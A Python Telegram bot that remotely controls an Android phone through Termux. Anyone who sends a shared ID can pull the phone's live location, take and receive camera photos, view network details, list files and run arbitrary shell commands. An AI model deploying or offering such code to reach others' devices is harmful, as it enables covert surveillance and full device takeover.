import telebot
import os
import logging
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Load bot token and unique ID
with open("bot_token.txt", "r") as file:
    BOT_TOKEN = file.read().strip()

with open("unique_id.txt", "r") as file:
    UNIQUE_ID = file.read().strip()

# Set up logging
logging.basicConfig(filename="bot_activity.log", level=logging.INFO, format="%(asctime)s - %(message)s")

# Telegram bot setup
bot = telebot.TeleBot(BOT_TOKEN)

# Authorized users (add Telegram user IDs to this list for extra security)
AUTHORIZED_USERS = []

# User verification
verified_users = {}

# Start command
@bot.message_handler(commands=["start"])
def start(message):
    bot.send_message(message.chat.id, "Welcome! Please enter the unique ID to verify your access.")

# Verify unique ID
@bot.message_handler(func=lambda message: message.text == UNIQUE_ID)
def verify_user(message):
    verified_users[message.chat.id] = True
    if message.chat.id not in AUTHORIZED_USERS:
        AUTHORIZED_USERS.append(message.chat.id)
    bot.send_message(message.chat.id, "Verification successful! Use the buttons below to control Termux.", reply_markup=control_buttons())
    logging.info(f"User {message.chat.id} verified and granted access.")

# Handle invalid ID
@bot.message_handler(func=lambda message: message.text != UNIQUE_ID and message.chat.id not in verified_users)
def invalid_id(message):
    bot.send_message(message.chat.id, "Invalid unique ID. Access denied.")
    logging.warning(f"User {message.chat.id} failed verification attempt.")

# Dynamic control buttons
def control_buttons():
    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(
        InlineKeyboardButton("Get Live Location", callback_data="location"),
        InlineKeyboardButton("Camera Access", callback_data="camera"),
        InlineKeyboardButton("Refresh IP Address", callback_data="ip"),
        InlineKeyboardButton("List Files", callback_data="list_files"),
        InlineKeyboardButton("Run Command", callback_data="custom_command")
    )
    return markup

# Button callbacks
@bot.callback_query_handler(func=lambda call: True)
def handle_buttons(call):
    if call.message.chat.id not in verified_users:
        bot.send_message(call.message.chat.id, "Access denied.")
        logging.warning(f"Unauthorized user {call.message.chat.id} attempted to access.")
        return

    if call.data == "location":
        location = os.popen("termux-location").read()
        bot.send_message(call.message.chat.id, f"Live Location:\n{location}")
        logging.info(f"Location fetched for user {call.message.chat.id}.")
    elif call.data == "camera":
        os.system("termux-camera-photo -c 0 /sdcard/captured.jpg")
        with open("/sdcard/captured.jpg", "rb") as photo:
            bot.send_photo(call.message.chat.id, photo)
        logging.info(f"Photo captured and sent to user {call.message.chat.id}.")
    elif call.data == "ip":
        ip_address = os.popen("ip addr show").read()
        bot.send_message(call.message.chat.id, f"IP Address:\n{ip_address}")
        logging.info(f"IP Address fetched for user {call.message.chat.id}.")
    elif call.data == "list_files":
        files = os.listdir(".")
        file_list = "\n".join(files)
        bot.send_message(call.message.chat.id, f"Files in current directory:\n{file_list}")
        logging.info(f"File list sent to user {call.message.chat.id}.")
    elif call.data == "custom_command":
        bot.send_message(call.message.chat.id, "Please send the command to execute.")
        bot.register_next_step_handler(call.message, run_custom_command)
    else:
        bot.send_message(call.message.chat.id, "Unknown command.")

# Run custom command
def run_custom_command(message):
    if message.chat.id not in verified_users:
        bot.send_message(message.chat.id, "Access denied.")
        return

    command = message.text
    try:
        output = os.popen(command).read()
        bot.send_message(message.chat.id, f"Command Output:\n{output}")
        logging.info(f"Custom command '{command}' executed for user {message.chat.id}.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error executing command: {e}")
        logging.error(f"Error executing command '{command}' for user {message.chat.id}: {e}")

# Start bot
bot.polling()
